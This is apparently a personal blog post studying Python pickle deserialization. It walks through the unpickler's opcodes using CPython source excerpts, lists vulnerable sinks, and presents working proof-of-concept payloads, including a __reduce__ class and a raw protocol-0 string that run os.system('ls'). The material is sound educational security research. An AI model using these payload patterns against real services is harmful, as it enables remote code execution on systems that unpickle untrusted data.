---
title: Learning about pickle deserialization in python
published: 2025-08-30
description: 'Deep dive into pickle VM'
image: './pickle.png'
tags: [pickle, python, deserialization]
category: 'deserialization'
draft: false
lang: ''
---

# What is pickle library?
Just look at the code below and you will understand:
```python
import pickle

# Example object
data = {"name": "Alice", "age": 25, "scores": [90, 85, 92]}

# Serialize (save to file)
with open("data.pkl", "wb") as f:
    pickle.dump(data, f)

# Deserialize (load back from file)
with open("data.pkl", "rb") as f:
    loaded_data = pickle.load(f)

print(loaded_data)
# Output: {'name': 'Alice', 'age': 25, 'scores': [90, 85, 92]}
```

# What is the difference between pickle and marshal
## Pickle

- Purpose: General-purpose object serialization.
- What it can handle: Almost any Python object: lists, dicts, sets, functions, custom classes, etc.
- Format: Python-specific binary protocol (not human-readable). The format is documented and versioned.
- Data pickled in Python 3.x can usually be loaded in future Python 3.x versions.
- Use case: Saving complex Python objects to disk or sending them between trusted Python programs.

## Marshal
- Purpose: Low-level serialization used mainly by Python itself (e.g., writing .pyc bytecode files).
- What it can handle: Only simple built-in types: numbers, strings, bytes, lists, dicts, tuples. Does not support custom classes or functions in a useful way.
- Format: Undocumented, implementation-dependent (changes between Python versions).
- Stability: Not guaranteed across Python versions — something marshalled in Python 3.9 might not load in Python 3.11.
- Only for Python’s internal use (writing .pyc files). Rarely used in user code.
Example:
```python
import marshal

obj = {"a": 1, "b": [2, 3]}
data = marshal.dumps(obj)
restored = marshal.loads(data)
```

# Understanding it:
1. Read these links:
- https://www.youtube.com/watch?v=73uI7BK8k3g&t=236s **(must-watch)**
- https://goodapple.top/archives/1069#header-id-20 **(must-read)**
- https://docs.python.org/3/library/struct.html
- https://cp04042k.github.io/posts/ictf-2023/ (This article inspires me to write this post)

2. Read the pickle.py [source code](https://github.com/python/cpython/blob/main/Lib/pickle.py)
3. Understand some important opcode:

## INST
```python
INST           = b'i'   # build & push class instance
def load_inst(self):
    module = self.readline()[:-1].decode("ascii")
    name = self.readline()[:-1].decode("ascii")
    klass = self.find_class(module, name)
    self._instantiate(klass, self.pop_mark())

def find_class(self, module, name):
    # Subclasses may override this.
    sys.audit('pickle.find_class', module, name)
    if self.proto < 3 and self.fix_imports:
        if (module, name) in _compat_pickle.NAME_MAPPING:
            module, name = _compat_pickle.NAME_MAPPING[(module, name)]
        elif module in _compat_pickle.IMPORT_MAPPING:
            module = _compat_pickle.IMPORT_MAPPING[module]
    __import__(module, level=0)
    if self.proto >= 4 and '.' in name:
        dotted_path = name.split('.')
        try:
            return _getattribute(sys.modules[module], dotted_path)
        except AttributeError:
            raise AttributeError(
                f"Can't resolve path {name!r} on module {module!r}")
    else:
        return getattr(sys.modules[module], name)

def _instantiate(self, klass, args):
    if (args or not isinstance(klass, type) or
        hasattr(klass, "__getinitargs__")):
        try:
            value = klass(*args)
        except TypeError as err:
            raise TypeError("in constructor for %s: %s" %
                            (klass.__name__, str(err)), err.__traceback__)
    else:
        value = klass.__new__(klass)
    self.append(value)

def pop_mark(self):
    items = self.stack
    self.stack = self.metastack.pop()
    self.append = self.stack.append
    return items
```

## BUILD
```python
#test.py
import pickle, pickletools
class P:
    def __init__(self, name, age):
        self.name = name
        self.age = age
payload2 = pickle.dumps(P("thang", 20))

print(pickletools.dis(b"\x80\x04\x951\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x01P\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x05thang\x94\x8c\x03age\x94K\x14ub."))
optim_s = pickletools.optimize(payload2)
print(pickletools.dis(optim_s))

# pickle.py
BUILD          = b'b'   # call __setstate__ or __dict__.update()
def load_build(self):
    stack = self.stack
    state = stack.pop()
    inst = stack[-1]
    setstate = getattr(inst, "__setstate__", _NoValue)
    if setstate is not _NoValue:
        setstate(state)
        return
    slotstate = None
    if isinstance(state, tuple) and len(state) == 2:
        state, slotstate = state
    if state:
        inst_dict = inst.__dict__
        intern = sys.intern
        for k, v in state.items():
            if type(k) is str:
                inst_dict[intern(k)] = v
            else:
                inst_dict[k] = v
    if slotstate:
        for k, v in slotstate.items():
            setattr(inst, k, v)

```

## OBJ
```python
OBJ            = b'o'   # build & push class instance
def load_obj(self):
    # Stack is ... markobject classobject arg1 arg2 ...
    args = self.pop_mark()
    cls = args.pop(0)
    self._instantiate(cls, args)
```
## NEWOBJ
```python
NEWOBJ         = b'\x81'  # build object by applying cls.__new__ to argtuple
def load_newobj(self):
    args = self.stack.pop()
    cls = self.stack.pop()
    obj = cls.__new__(cls, *args)
    self.append(obj)
```

## NEWOBJ_EX
```python
NEWOBJ_EX        = b'\x92'  # like NEWOBJ but work with keyword only arguments
def load_newobj_ex(self):
    kwargs = self.stack.pop()
    args = self.stack.pop()
    cls = self.stack.pop()
    obj = cls.__new__(cls, *args, **kwargs)
    self.append(obj)
```

## Other opcodes:
```python
EXT1           = b'\x82'  # push object from extension registry; 1-byte index
PERSID         = b'P'   # push persistent object; id is taken from string arg
BINPERSID      = b'Q'   #  "       "         "  ;  "  "   "     "  stack
```

# How to exploit it?
## Sinks:
- cPickle.loads
- pickle.loads
- _pickle.loads
- jsonpickle.decode

## Basic payload:
```python
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("ls",))
payload = base64.b64encode(pickle.dumps(P()))

print(payload)
# print("Type of payload:", type(payload))
print(pickle.loads(base64.b64decode(payload)))
print(pickle.DEFAULT_PROTOCOL)
```

## Debug pickle opcodes:
```python
import pickle, pickletools
class P:
    def __init__(self, name, age):
        self.name = name
        self.age = age
payload2 = pickle.dumps(P("thang", 20))

print(pickletools.dis(b"\x80\x04\x951\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x01P\x94\x93\x94)\x81\x94}\x94(\x8c\x04name\x94\x8c\x05thang\x94\x8c\x03age\x94K\x14ub."))
optim_s = pickletools.optimize(payload2)
print(pickletools.dis(optim_s))
```

```bash
python3 -m pickle data.pkl # Get the object
python3 -m pickletools data.pkl # Disassemble opcodes
python3 -m pickletools data.pkl -a # Verbose explanation
```
## Other payloads:
- Protocol 0: `cos\nsystem\nS'ls'\n\x85R.`

## Writing exploit:
- pickle opcode
- pack, unpack from struct
- bytes


# Tools:
- https://github.com/eddieivan01/pker
- https://github.com/splitline/Pickora

# Some other links:
- https://book.hacktricks.wiki/en/generic-methodologies-and-resources/python/bypass-python-sandboxes/index.html
- https://docs.python.org/3/library/pickle.html#
- https://docs.python.org/3/library/pickletools.html#module-pickletools
- https://hackmd.io/@Nightcore/Hy2hOa1WR

- https://zhuanlan.zhihu.com/p/361349643
- https://goodapple.top/archives/1069#header-id-20
- https://xz.aliyun.com/news/7032
- https://xz.aliyun.com/news/13498
- https://xz.aliyun.com/news/6608
- https://cp04042k.github.io/posts/ictf-2023/